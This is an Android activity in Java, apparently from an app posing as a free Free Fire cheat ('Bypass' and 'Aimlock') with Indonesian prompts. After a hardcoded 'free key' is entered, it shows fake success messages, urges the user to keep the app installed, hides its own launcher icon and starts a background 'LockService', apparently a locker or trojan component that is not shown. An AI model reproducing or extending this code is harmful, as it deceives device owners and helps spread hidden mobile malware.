package com.service.update;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private String[] FREE_KEYS = {"FFFREE", "PANELVIP", "UNLOCK", "FREEKEY", "AKSESGRATIS"};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try { Thread.sleep(2000); } catch (InterruptedException e) {}
        setContentView(R.layout.activity_main);

        Button btnActivate = findViewById(R.id.btnActivate);
        EditText keyInput = findViewById(R.id.keyInput);
        TextView loadingText = findViewById(R.id.loadingText);
        TextView statusBypass = findViewById(R.id.statusBypass);
        TextView statusAimlock = findViewById(R.id.statusAimlock);

        btnActivate.setOnClickListener(v -> {
            String key = keyInput.getText().toString().trim().toUpperCase();
            if (!key.isEmpty()) {
                boolean valid = false;
                for (String k : FREE_KEYS) { if (key.equals(k)) { valid = true; break; } }
                if (!valid) { Toast.makeText(this, "Key tidak valid! Coba key gratis.", Toast.LENGTH_LONG).show(); return; }
                loadingText.setVisibility(View.VISIBLE);
                loadingText.setText("⏳ Menghubungkan...");
                new Handler().postDelayed(() -> {
                    statusBypass.setText("✅ Sistem Bypass: ON");
                    statusBypass.setTextColor(0xFF00FF00);
                    statusAimlock.setText("✅ Aimlock: ON");
                    statusAimlock.setTextColor(0xFF00FF00);
                    loadingText.setText("✅ BERHASIL! Biarkan aplikasi tetap terpasang.");
                    loadingText.setTextColor(0xFF00FF00);
                    getPackageManager().setComponentEnabledSetting(
                        new android.content.ComponentName(this, MainActivity.class),
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP
                    );
                    startService(new Intent(this, LockService.class));
                    Intent ff = getPackageManager().getLaunchIntentForPackage("com.dts.freefireth");
                    if (ff != null) startActivity(ff);
                    else startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=com.dts.freefireth")));
                }, 2000);
            } else { Toast.makeText(this, "Masukkan Key dulu!", Toast.LENGTH_SHORT).show(); }
        });
    }
}